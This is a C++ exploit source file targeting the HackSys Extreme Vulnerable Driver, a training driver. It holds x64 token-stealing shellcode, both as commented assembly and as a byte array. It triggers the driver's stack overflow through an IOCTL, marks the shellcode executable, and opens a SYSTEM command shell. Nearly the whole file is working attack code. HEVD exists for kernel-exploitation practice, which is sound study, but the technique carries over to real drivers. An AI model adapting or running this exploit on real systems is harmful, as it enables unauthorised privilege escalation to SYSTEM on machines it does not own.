#include <iostream>
#include <stdio.h>
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
/*
adapted from: https://www.matteomalvica.com/blog/2019/07/06/windows-kernel-shellcode/
push r9
push r8
push rax
push rcx
push rdx

mov r9, [gs:0x188]           ;stores KPROCESS/currentThread value
mov r9, [r9+0x220]                 ;stores EPROCESS as an offset to KTHREAD
mov r8, [r9+0x3e8]                ;stores InheritedFromUniqueProcessId (cmd.exe PID)
mov rax, r9                        ;moves cmd's EPROCESS into eax
loop1:
  mov rax, [rax + 0x2f0]           ;saves the next linked list pointer into rax
  sub rax, 0x2f0                    ;gets the KPROCESS
  cmp [rax + 0x2e8],r8             ;compare the ProcessId with cmd's.
  jne loop1
mov rcx, rax                       ;if equal, saves cmd's EPROCESS into rcx
add rcx, 0x360                     ;store cmd's token into rcx dt _eprocess address=!process pid_en_hexadecimal 0
mov rax, r9                        ;moves cmd's EPROCESS into eax
loop2:
  mov rax, [rax +0x2f0]            ;saves the next linked list pointer into rax
  sub rax, 0x2f0                   ;gets the KPROCESS
  cmp byte [rax + 0x2e8], 4        ;compare the ProcessId with System(4)
  jne loop2

mov rdx, rax                    ;if equal, saves System's EPROCESS into rdx
add rdx, 0x360                  ;stores System's token pointer into rdx
mov rdx, [rdx]                     ;stores System's token value into rdx
mov [rcx], rdx      ;replace cmd's original token with System's
; restore
pop rdx
pop   rcx
pop    rax
pop    r8
pop    r9
xor    r12,r12 ; after some headaches this did the trick
add    rsp,0x28
ret


*/
char buffer[] = {
	0xcc,
 0x41, 0x51, 0x41, 0x50, 0x50, 0x51, 0x52, 0x65, 0x4C, 0x8B, 0x0C, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4D, 0x8B, 0x89, 0x20, 0x02, 0x00, 0x00, 0x4D, 0x8B, 0x81, 0xE8, 0x03, 0x00, 0x00, 0x4C, 0x89, 0xC8, 0x48, 0x8B, 0x80, 0xF0, 0x02, 0x00, 0x00, 0x48, 0x2D, 0xF0, 0x02, 0x00, 0x00, 0x4C, 0x39, 0x80, 0xE8, 0x02, 0x00, 0x00, 0x75, 0xEA, 0x48, 0x89, 0xC1, 0x48, 0x81, 0xC1, 0x60, 0x03, 0x00, 0x00, 0x4C, 0x89, 0xC8, 0x48, 0x8B, 0x80, 0xF0, 0x02, 0x00, 0x00, 0x48, 0x2D, 0xF0, 0x02, 0x00, 0x00, 0x80,0xb8,0xe8,0x02,0x00,0x00,0x4,
 0x75, 0xea, 0x48, 0x8b, 0xd0, 0x48, 0x81, 0xC2, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8B, 0x12, 
 0x48, 0x89, 0x11, 0x5A, 0x59, 0x58, 0x41, 0x58, 0x41, 0x59,0x48, 0x31, 0xF6, 0x48, 0x31, 0xFF, 0x4D, 0x31, 0xFF, 0x4D, 0x31, 0xF6, 0x4D, 0x31, 0xE4, 0x48, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3
	
};

void exploit(void) {
	HANDLE driverHandle;
	DWORD oldProtect;
	char exploit[2072 + 8];

	printf("[*] Preparing our exploit buffer\n");
	// Fill our exploit buffer with 'A'
	memset(exploit, 0x41, 2072);

	// Add our RIP address
	*(unsigned long long*)(exploit + 2072) = (unsigned long long)buffer;

	printf("[*] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");
	driverHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("[!] FATAL: Could not open HEVD handle\n");
		return;
	}

	printf("[*] Making our shellcode memory at %p RWE\n", buffer);
	if (!VirtualProtect(buffer, sizeof(buffer), PAGE_EXECUTE_READWRITE, &oldProtect)) {
		puts("VirtualProtect error\n");
	}

	puts("waiting...");
	std::cin.get();
	if (!DeviceIoControl(driverHandle, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, (void *)exploit, sizeof(exploit), NULL, 0, NULL, NULL)) {
		printf("[!] FATAL: Error sending IOCTL to driver\n");
		return;
	}

	printf("[:)] Success, enjoy your new SYSTEM shell\n");
}

int main()
{
	exploit();
	system("cmd.exe /c cmd.exe /K cd C:\\");
	return 0;
}
